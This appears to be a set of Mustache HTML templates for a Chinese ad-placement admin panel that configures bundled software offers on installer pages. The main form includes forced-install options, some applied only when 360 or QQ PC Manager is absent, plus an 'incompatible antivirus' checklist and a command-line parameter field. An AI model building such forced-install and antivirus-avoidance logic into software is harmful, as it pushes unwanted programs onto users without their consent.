<script id="modalTemp" type="x-tmpl-mustache">
	<div class="modal-header">
		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
		<h3 id="myModalLabel"><% header %></h3>
	</div>
	<div class="modal-body" style="height:240px;">
		<form id="materialForm" class="form-horizontal">

			<div class="control-group">
				<label class="control-label">选择广告物料 <span class="red bold">*</span></label>
				<div class="controls"  id="selid">
					<select name="materialId">
						<option value="0">---请选择---</option>
						{{--@foreach ($materials as $val)--}}
						{{--<option value="{{ $val['id'] }}">{{ $val['name'] }}</option>--}}
						{{--@endforeach--}}
					</select>
				</div>
			</div>

			<div class="control-group">
				<label class="control-label">广告物料名称 <span class="red bold">*</span></label>
				<div class="controls">
					<input type="text" name="name" />
				</div>
			</div>
			
			<div class="control-group">
				<label class="control-label">渠道ID<span class="red bold">*</span></label>
				<div class="controls">
					<input type="text" name="mlinkName" />
				</div>
			</div>
			
			<div class="control-group">
				<label class="control-label">渠道url(链接地址) <span class="red bold">*</span></label>
				<div class="controls">
					<input type="text" name="link" />
				</div>
			</div>
			<div class="control-group install createlink" style="display:none;">
				<label class="control-label">本地安装名称</label>
				<div class="controls">
					<input type="text" name="savePath" />
				</div>
			</div>

			<div class="control-group createlink startpage" style="display:none;">
				<label class="control-label">渠道包名（链接名称）</label>
				<div class="controls">
					<input type="text" name="linkName" />
				</div>
			</div>

			<div class="control-group install" style="display:none;">
				<label class="control-label">执行参数</label>
				<div class="controls">
					<input type="text" name="cmdLine" />
				</div>
			</div>

			<div class="control-group install" style="display:none;">
				<label class="control-label" style="color:red;">匹配软件名称</label>
				<div class="controls">
					<input type="text" name="detectItem" />
				</div>
			</div>
			<div class="control-group">
				<label class="control-label">字体颜色</label>
				<div class="controls">
					<input type="text" data-color-format="hex" class="colorpicker" data-color="#000000"  name="linkColor" />
				</div>
			</div>

			<div class="control-group">
				<label class="control-label">备选物料 <span class="red bold">*</span></label>
				<div class="controls">
					<select name="altmaterialId">
						<option value="0">---请选择---</option>
						{{--@foreach ($newad as $val)--}}
						{{--<option value="{{ $val['id'] }}">{{ $val['name'] }}</option>--}}
						{{--@endforeach--}}
					</select>
				</div>
			</div>

			<div class="control-group">
				<label class="control-label">二三线城市安装策略 <span class="red bold">*</span></label>
				<div class="controls">
					<select name="cssilent">
						<option value="0">关闭</option>
						<option value="1">强制安装</option>
						<option value="2">定点投放</option>
						<option value="3">定点强制</option>
						<option value="4">非电脑管家强制</option>
						<option value="5">非360强制</option>
						<option value="6">双非强制</option>

					</select>
				</div>
			</div>
			
			<div class="control-group">
				<label class="control-label">不兼容的杀毒软件 <span class="red bold">*</span></label>
				<div class="controls">
					<label><input type="checkbox" name="sdSoft[]" value='1' /> 360安全卫士</label>
					<label><input type="checkbox" name="sdSoft[]" value='2' /> 360杀毒</label>
					<label><input type="checkbox" name="sdSoft[]" value='4' /> QQ电脑管家</label>
					<label><input type="checkbox" name="sdSoft[]" value='8' /> 金山卫士</label>
					<label><input type="checkbox" name="sdSoft[]" value='16' /> 百度杀毒</label>
					<label><input type="checkbox" name="sdSoft[]" value='32' /> 百度卫士</label>
				</div>
			</div>
			<input type="hidden" name="logoUrl" />
			<input type="hidden" name="showTime" />
			<input type="hidden" name="img" />
			<input type="hidden" name="place" />
		</form>
	</div>
	<div class="modal-footer">
		<input type="hidden" name="materialContent" />
		<input type="hidden" name="pageId" />
		<input type="hidden" name="itemId" />
		<button class="btn" data-dismiss="modal" aria-hidden="true">关闭</button>
		<button class="btn btn-primary saveMaterialBtn">保存</button>
	</div>
</script>

<script id="selTemp" type="x-tmpl-mustache">
    <option value="<% selval %>"><% selname %></option>
</script>

<script id="itemTemp" type="x-tmpl-mustache">
    <tr id="<% itemId %>">
        <td class="materName">
        	<i class="icon-ok-sign"></i> <span class="blue"></span>
        </td>
        <td class="altMaterName">
        	<span class="blue"></span>
        </td>
        <td class="materOptions">
        	<input type="hidden" name="content[<% pageId %>][]" value=""  />
        	<a href="javascript:void(0);" page-id="<% pageId %>" item-id="<% itemId %>" class="tip-top itemEditBtn" data-original-title="编辑"><i class="icon-pencil"></i></a>
        </td>
    </tr>
</script>

<script id="pageTemp" type="x-tmpl-mustache">
	<div class="accordion-group widget-box">
	    <div class="accordion-heading">
	        <div class="widget-title">
	            <a data-parent="#collapse-group" href="#<% contentid %>" data-toggle="collapse">
	                <span class="icon"><i class="icon-th-list"></i></span><h5><% pagename %></h5>
	            </a>
	        </div>
	    </div>
	    <div class="collapse accordion-body" id="<% contentid %>">
	        <div class="widget-content nopadding width-half">
	            <table class="table table-striped table-bordered">
                    <thead>
                        <tr>
                            <th width="45%">物料名称1</th>
                            <th width="30%">备选物料1</th>
                            <th width="25%">操作1</th>
                        </tr>
                    </thead>
                    <tbody>

                    </tbody>
                </table>
	        </div>
			<div class="widget-content nopadding width-half">
				<table class="table table-striped table-bordered">
					<thead>
						<tr>
							<th width="45%">物料名称2</th>
							<th width="30%">备选物料2</th>
							<th width="25%">操作2</th>
						</tr>
					</thead>
					<tbody>

					</tbody>
				</table>
			</div>
	    </div>
	</div>
</script>
<script id="moveTemp" type="x-tmpl-mustache">
	<div class="modal-header">
		<button type="button" class="close" data-dismiss="modal" aria-hidden="true">×</button>
		<h3 id="myModalLabel"><% header %></h3>
	</div>
	<div class="modal-body" style="height:240px;">
		<form id="materialForm" class="form-horizontal">
			<input type="hidden" name="itemId" />
			<div id="movepage1" class="control-group install createlink" style="display:none;">
				<label class="control-label">首页底侧</label>
				<div class="controls">
					<input type="radio" name="moveItemId" />
				</div>
			</div>
			
			<div id="movepage2" class="control-group install createlink" style="display:none;">
				<label class="control-label">首页右侧</label>
				<div class="controls">
					<input type="radio" name="moveItemId" />
				</div>
			</div>
			
			<div id="movepage3" class="control-group install createlink" style="display:none;">
				<label class="control-label">第二页</label>
				<div class="controls">
					<input type="radio" name="moveItemId" />
				</div>
			</div>
			
			<div id="movepage4" class="control-group install createlink" style="display:none;">
				<label class="control-label">安装完成</label>
				<div class="controls">
					<input type="radio" name="moveItemId" />
				</div>
			</div>
			
			<div id="movealternative" class="control-group install createlink" style="display:none;">
				<label class="control-label">备选区</label>
				<div class="controls">
					<input type="radio" name="moveItemId" />
				</div>
			</div>
			
		</form>
	</div>
</script>
